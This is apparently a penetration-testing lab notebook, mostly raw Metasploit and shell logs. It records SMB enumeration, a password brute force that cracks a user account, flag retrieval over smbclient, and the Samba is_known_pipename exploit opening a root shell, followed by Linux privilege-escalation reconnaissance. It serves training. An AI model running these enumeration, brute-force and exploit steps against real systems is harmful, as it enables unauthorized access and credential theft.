S-1-5-21-3690628376-3985617143-2159776750-548 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-549 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-550 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1000 SAMBA-RECON-BRUTE\shawn (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1001 SAMBA-RECON-BRUTE\jane (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1002 SAMBA-RECON-BRUTE\nancy (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1003 SAMBA-RECON-BRUTE\admin (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1004 SAMBA-RECON-BRUTE\Maintainer (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1005 SAMBA-RECON-BRUTE\Reserved (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1006 SAMBA-RECON-BRUTE\Testing (Local Group)
S-1-5-21-3690628376-3985617143-2159776750-1007 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1008 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1009 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1010 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1011 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1012 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1013 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1014 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1015 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1016 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1017 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1018 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1019 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1020 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1021 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1022 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1023 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1024 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1025 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1026 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1027 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1028 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1029 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1030 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1031 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1032 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1033 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1034 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1035 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1036 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1037 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1038 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1039 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1040 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1041 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1042 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1043 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1044 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1045 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1046 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1047 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1048 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1049 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1050 *unknown*\*unknown* (8)
enum4linux complete on Wed Dec  6 06:52:33 2023


msf5 auxiliary(scanner/smb/smb_version) > `set rhosts 192.157.202.3`
rhosts => 192.157.202.3
msf5 auxiliary(scanner/smb/smb_version) > `run`

[*] 192.157.202.3:445     - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] 192.157.202.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf5 > `use auxiliary/scanner/smb/smb_enumshares `
msf5 auxiliary(scanner/smb/smb_enumshares) > `set rhosts 192.157.202.3`
rhosts => 192.157.202.3
msf5 auxiliary(scanner/smb/smb_enumshares) > `run`

[+] 192.157.202.3:139     - public - (DS) 
[+] 192.157.202.3:139     - john - (DS) 
[+] 192.157.202.3:139     - aisha - (DS) 
[+] 192.157.202.3:139     - emma - (DS) 
[+] 192.157.202.3:139     - everyone - (DS) 
[+] 192.157.202.3:139     - IPC$ - (I) IPC Service (samba.recon.lab)
[*] 192.157.202.3:        - Scanned 1 of 1 

msf5 > `use auxiliary/scanner/smb/smb_enumusers`
msf5 auxiliary(scanner/smb/smb_enumusers) > `set rhosts 192.143.123.3`
rhosts => 192.143.123.3
msf5 auxiliary(scanner/smb/smb_enumusers) > `run`

[+] 192.143.123.3:139     - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
[*] 192.143.123.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf5 > `use auxiliary/scanner/smb/smb_login`
msf5 auxiliary(scanner/smb/smb_login) > `set rhosts 192.253.104.3` 
rhosts => 192.253.104.3
msf5 auxiliary(scanner/smb/smb_login) > `options`

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS             192.253.104      yes       The target address range or CIDR identifier
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > `set smbuser jane`
smbuser => jane
msf5 auxiliary(scanner/smb/smb_login) > `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
pass_file => file /usr/share/wordlists/metasploit/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > `run`

[*] 192.253.104.3:445     - 192.253.104.3:445 - Starting SMB login bruteforce
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:admin',
[!] 192.253.104.3:445     - No active DB -- Credential data will not be saved!
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:123456',
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:12345',
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:123456789',
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:password',
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:iloveyou',
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:princess',
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:1234567',
[-] 192.253.104.3:445     - 192.253.104.3:445 - Failed: '.\jane:12345678',
[+] 192.253.104.3:445     - 192.253.104.3:445 - Success: '.\jane:abc123'
[*] 192.253.104.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf5 > `use auxiliary/scanner/smb/pipe_auditor`
msf5 auxiliary(scanner/smb/pipe_auditor) > `options`

Module options (auxiliary/scanner/smb/pipe_auditor):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target address range or CIDR identifier
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/pipe_auditor) > `set smbuser admin`
smbuser => admin
msf5 auxiliary(scanner/smb/pipe_auditor) > `set smbpass password1`
smbpass => password1
msf5 auxiliary(scanner/smb/pipe_auditor) > `set rhosts 192.241.81.3`
rhosts => 192.241.81.3
msf5 auxiliary(scanner/smb/pipe_auditor) > `run`

[+] 192.241.81.3:139      - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
[*] 192.241.81.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

we get the pipes \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc

msf5 > `use auxiliary/scanner/smb/`

Matching Modules
================

   #   Name                                         Disclosure Date  Rank    Check  Description
   -   ----                                         ---------------  ----    -----  -----------
   1   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal  Yes    DCOM Exec
   2   auxiliary/scanner/smb/impacket/secretsdump                    normal  Yes    DCOM Exec
   3   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal  Yes    WMI Exec
   4   auxiliary/scanner/smb/pipe_auditor                            normal  Yes    SMB Session Pipe Auditor
   5   auxiliary/scanner/smb/pipe_dcerpc_auditor                     normal  Yes    SMB Session Pipe DCERPC Auditor
   6   auxiliary/scanner/smb/psexec_loggedin_users                   normal  Yes    Microsoft Windows Authenticated Logged In Users Enumeration
   7   auxiliary/scanner/smb/smb1                                    normal  Yes    SMBv1 Protocol Detection
   8   auxiliary/scanner/smb/smb2                                    normal  Yes    SMB 2.0 Protocol Detection
   9   auxiliary/scanner/smb/smb_enum_gpp                            normal  Yes    SMB Group Policy Preference Saved Passwords Enumeration
   10  auxiliary/scanner/smb/smb_enumshares                          normal  Yes    SMB Share Enumeration
   11  auxiliary/scanner/smb/smb_enumusers                           normal  Yes    SMB User Enumeration (SAM EnumUsers)
   12  auxiliary/scanner/smb/smb_enumusers_domain                    normal  Yes    SMB Domain User Enumeration
   13  auxiliary/scanner/smb/smb_login                               normal  Yes    SMB Login Check Scanner
   14  auxiliary/scanner/smb/smb_lookupsid                           normal  Yes    SMB SID User Enumeration (LookupSid)
   15  auxiliary/scanner/smb/smb_ms17_010                            normal  Yes    MS17-010 SMB RCE Detection
   16  auxiliary/scanner/smb/smb_uninit_cred                         normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   17  auxiliary/scanner/smb/smb_version                             normal  Yes    SMB Version Detection

msf5 > `use auxiliary/scanner/smb/smb2`
msf5 auxiliary(scanner/smb/smb2) > `options`

Module options (auxiliary/scanner/smb/smb2):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    445              yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb2) > `set rhosts 192.143.123.3`
rhosts => 192.143.123.3
msf5 auxiliary(scanner/smb/smb2) > `run`

[+] 192.143.123.3:445     - 192.143.123.3 supports SMB 2 [dialect 255.2] and has been online for 3707311 hours
[*] 192.143.123.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 > `use auxiliary/scanner/smb/pipe_auditor`
msf5 auxiliary(scanner/smb/pipe_auditor) > `options`

Module options (auxiliary/scanner/smb/pipe_auditor):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target address range or CIDR identifier
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/pipe_auditor) > `set smbuser admin`
smbuser => admin
msf5 auxiliary(scanner/smb/pipe_auditor) > `set smbpass password1`
smbpass => password1
msf5 auxiliary(scanner/smb/pipe_auditor) > `set rhosts 192.241.81.3`
rhosts => 192.241.81.3
msf5 auxiliary(scanner/smb/pipe_auditor) > `run`

[+] 192.241.81.3:139      - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
[*] 192.241.81.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

root@attackdefense:~# `smbclient //192.180.12.3/shawn -U admin`
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \run\> `?`
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!             
smb: \> `ls`
  .                                   D        0  Thu Dec 28 06:13:41 2023
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  test                                D        0  Tue Nov 27 19:25:12 2018
  dev                                 D        0  Tue Nov 27 19:25:12 2018
  run                                 D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 195970508 blocks available
smb: \> `cd test`
smb: \test\> `ls`
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Thu Dec 28 06:13:41 2023

                1981084628 blocks of size 1024. 195970508 blocks available
smb: \test\>` cd ..`
smb: \> `cd dev`
smb: \dev\> `ls`
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Thu Dec 28 06:13:41 2023

                1981084628 blocks of size 1024. 195970504 blocks available
smb: \dev\> `cd ..`
smb: \> `cd run`
smb: \run\> `ls`
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Thu Dec 28 06:13:41 2023

                1981084628 blocks of size 1024. 195970424 blocks available
smb: \run\> `exit`
root@attackdefense:~# 

root@attackdefense:~# `smbclient //192.180.12.3/nancy -U admin`
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \> `dir`
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  dir                                 D        0  Tue Nov 27 19:25:12 2018
  tmp                                 D        0  Tue Nov 27 19:25:12 2018
  srv                                 D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 195969732 blocks available
smb: \> `cd tmp`
smb: \tmp\> `ls`
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 195969796 blocks available
smb: \tmp\> `cd ..`
smb: \> `cd srv`
smb: \srv\> `ls`
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 195969796 blocks available
smb: \srv\> `cd ..`
smb: \> `cd dir`
smb: \dir\> `ls`
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  flag                                N       33  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 195969708 blocks available
smb: \dir\> `get flag`
getting file \dir\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
smb: \dir\> `exit`
root@attackdefense:~# `cat flag` 
a1157f23d040fb4bc6f9a7


msf5 > `search type:exploit samba`

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   1   exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   2   exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   3   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   4   exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   5   exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   6   exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   7   exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   8   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
   9   exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   10  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   11  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   12  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   13  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   14  exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
   15  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   16  exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   17  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
   18  exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
   19  exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource


msf5 > `use exploit/linux/samba/is_known_pipename `
msf5 exploit(linux/samba/is_known_pipename) > `options`

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS                           yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > `set RHOSTS 192.154.150.3`
RHOSTS => 192.154.150.3
msf5 exploit(linux/samba/is_known_pipename) > `run`

[*] 192.154.150.3:445 - Using location \\192.154.150.3\exploitable\tmp for the path
[*] 192.154.150.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.154.150.3:445 - Share 'exploitable' has server-side path '/
[*] 192.154.150.3:445 - Uploaded payload to \\192.154.150.3\exploitable\tmp\RbTvXIBX.so
[*] 192.154.150.3:445 - Loading the payload from server-side path /tmp/RbTvXIBX.so using \\PIPE\/tmp/RbTvXIBX.so...
[-] 192.154.150.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.154.150.3:445 - Loading the payload from server-side path /tmp/RbTvXIBX.so using /tmp/RbTvXIBX.so...
[+] 192.154.150.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.154.150.2:35005 -> 192.154.150.3:445) at 2024-01-10 06:15:53 +0000

`whoami`
root


```

*****************************************************************************
```
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
user@debian:~$ uname
Linux
user@debian:~$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
user@debian:~$ uname -r
2.6.32-5-amd64
user@debian:~$ cat /proc/version
Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014
user@debian:~$ cat /etc/issue
Debian GNU/Linux 6.0 \n \l

user@debian:~$ cat /etc/*issue
Debian GNU/Linux 6.0 \n \l

user@debian:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
user@debian:~$ 
user@debian:~$ ps
  PID TTY          TIME CMD
 2479 pts/0    00:00:00 bash
 2987 pts/0    00:00:00 ps
user@debian:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   8396   812 ?        Ss   06:09   0:01 init [2]  
root         2  0.0  0.0      0     0 ?        S    06:09   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    06:09   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S    06:09   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    06:09   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S    06:09   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S    06:09   0:00 [cpuset]
root         8  0.0  0.0      0     0 ?        S    06:09   0:00 [khelper]
root         9  0.0  0.0      0     0 ?        S    06:09   0:00 [netns]
root        10  0.0  0.0      0     0 ?        S    06:09   0:00 [async/mgr]
root        11  0.0  0.0      0     0 ?        S    06:09   0:00 [pm]
root        12  0.0  0.0      0     0 ?        S    06:09   0:00 [xenwatch]
root        13  0.0  0.0      0     0 ?        S    06:09   0:00 [xenbus]
root        14  0.0  0.0      0     0 ?        S    06:09   0:00 [sync_supers]
root        15  0.0  0.0      0     0 ?        S    06:09   0:00 [bdi-default]
root        16  0.0  0.0      0     0 ?        S    06:09   0:00 [kintegrityd/0]
root        17  0.0  0.0      0     0 ?        S    06:09   0:00 [kblockd/0]
root        18  0.0  0.0      0     0 ?        S    06:09   0:00 [kacpid]
root        19  0.0  0.0      0     0 ?        S    06:09   0:00 [kacpi_notify]
root        20  0.0  0.0      0     0 ?        S    06:09   0:00 [kacpi_hotplug]
root        21  0.0  0.0      0     0 ?        S    06:09   0:00 [kseriod]
root        23  0.0  0.0      0     0 ?        S    06:09   0:00 [kondemand/0]
root        24  0.0  0.0      0     0 ?        S    06:09   0:00 [khungtaskd]
root        25  0.0  0.0      0     0 ?        S    06:09   0:00 [kswapd0]
root        26  0.0  0.0      0     0 ?        SN   06:09   0:00 [ksmd]
root        27  0.0  0.0      0     0 ?        S    06:09   0:00 [aio/0]
root        28  0.0  0.0      0     0 ?        S    06:09   0:00 [crypto/0]
root       140  0.0  0.0      0     0 ?        S    06:09   0:00 [ata/0]
root       141  0.0  0.0      0     0 ?        S    06:09   0:00 [ata_aux]
root       142  0.0  0.0      0     0 ?        S    06:09   0:00 [scsi_eh_0]
root       143  0.0  0.0      0     0 ?        S    06:09   0:00 [scsi_eh_1]
root       173  0.0  0.0      0     0 ?        S    06:09   0:00 [kjournald]
root       236  0.0  0.0      0     0 ?        S    06:09   0:00 [flush-202:0]
root       238  0.0  0.1  16916   852 ?        S<s  06:09   0:00 udevd --daemon
root       363  0.0  0.0      0     0 ?        S    06:09   0:00 [kpsmoused]
root       875  0.0  0.1  16912   772 ?        S<   06:10   0:00 udevd --daemon
root       876  0.0  0.1  16912   700 ?        S<   06:10   0:00 udevd --daemon
root      1192  0.0  0.2   6796  1016 ?        Ss   06:11   0:00 dhclient -v -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
daemon    1222  0.0  0.1   8136   532 ?        Ss   06:11   0:00 /sbin/portmap
statd     1254  0.0  0.1  14424   892 ?        Ss   06:11   0:00 /sbin/rpc.statd
root      1257  0.0  0.0      0     0 ?        S    06:11   0:00 [rpciod/0]
root      1259  0.0  0.0      0     0 ?        S<   06:11   0:00 [kslowd000]
root      1260  0.0  0.0      0     0 ?        S<   06:11   0:00 [kslowd001]
root      1261  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsiod]
root      1268  0.0  0.1  27064   588 ?        Ss   06:11   0:00 /usr/sbin/rpc.idmapd
root      1481  0.0  0.3  54336  1664 ?        Sl   06:11   0:00 /usr/sbin/rsyslogd -c4
root      1581  0.0  0.1   3960   648 ?        Ss   06:11   0:00 /usr/sbin/acpid
root      1615  0.0  0.6  71424  3260 ?        Ss   06:11   0:00 /usr/sbin/apache2 -k start
root      1769  0.0  0.2  22468  1072 ?        Ss   06:11   0:00 /usr/sbin/cron
root      1795  0.0  0.0      0     0 ?        S    06:11   0:00 [lockd]
root      1800  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd4]
root      1801  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1802  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1803  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1804  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1805  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1806  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1807  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1808  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1818  0.0  0.0  14668   436 ?        Ss   06:11   0:00 /usr/sbin/rpc.mountd --manage-gids
root      1844  0.0  0.2  61864  1308 ?        Ss   06:11   0:00 nginx: master process /usr/sbin/nginx
www-data  1846  0.0  0.3  62232  1840 ?        S    06:11   0:00 nginx: worker process
www-data  1847  0.0  0.3  62232  1840 ?        S    06:11   0:00 nginx: worker process
www-data  1848  0.0  0.3  62232  1824 ?        S    06:11   0:00 nginx: worker process
www-data  1849  0.0  0.3  62232  1820 ?        S    06:11   0:00 nginx: worker process
root      1865  0.0  0.2  49224  1164 ?        Ss   06:11   0:00 /usr/sbin/sshd
root      1868  0.0  0.2   9180  1396 ?        S    06:11   0:00 /bin/sh /usr/bin/mysqld_safe
root      2025  0.0  4.7 163420 24124 ?        Sl   06:11   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      2026  0.0  0.1   3896   644 ?        S    06:11   0:00 logger -t mysqld -p daemon.error
101       2414  0.0  0.1  32716   996 ?        Ss   06:11   0:00 /usr/sbin/exim4 -bd -q30m
root      2458  0.0  0.1   5972   636 tty1     Ss+  06:11   0:00 /sbin/getty 38400 tty1
root      2459  0.0  0.1   5972   632 tty2     Ss+  06:11   0:00 /sbin/getty 38400 tty2
root      2460  0.0  0.1   5972   632 tty3     Ss+  06:11   0:00 /sbin/getty 38400 tty3
root      2461  0.0  0.1   5972   636 tty4     Ss+  06:11   0:00 /sbin/getty 38400 tty4
root      2462  0.0  0.1   5972   632 tty5     Ss+  06:11   0:00 /sbin/getty 38400 tty5
root      2463  0.0  0.1   5972   636 tty6     Ss+  06:11   0:00 /sbin/getty 38400 tty6
root      2476  0.0  0.6  70544  3292 ?        Ss   06:11   0:00 sshd: user [priv]
user      2478  0.0  0.3  70544  1664 ?        S    06:11   0:00 sshd: user@pts/0 
user      2479  0.0  0.4  19276  2044 pts/0    Ss   06:11   0:00 -bash
www-data  2694  0.0  0.3  71424  2000 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
www-data  2695  0.0  0.5 294852  2668 ?        Sl   06:25   0:00 /usr/sbin/apache2 -k start
www-data  2696  0.0  0.5 294852  2688 ?        Sl   06:25   0:00 /usr/sbin/apache2 -k start
user      2988  0.0  0.2  16380  1180 pts/0    R+   06:42   0:00 ps aux
user@debian:~$ ps aux | grep root
root         1  0.0  0.1   8396   812 ?        Ss   06:09   0:01 init [2]  
root         2  0.0  0.0      0     0 ?        S    06:09   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    06:09   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S    06:09   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    06:09   0:00 [watchdog/0]
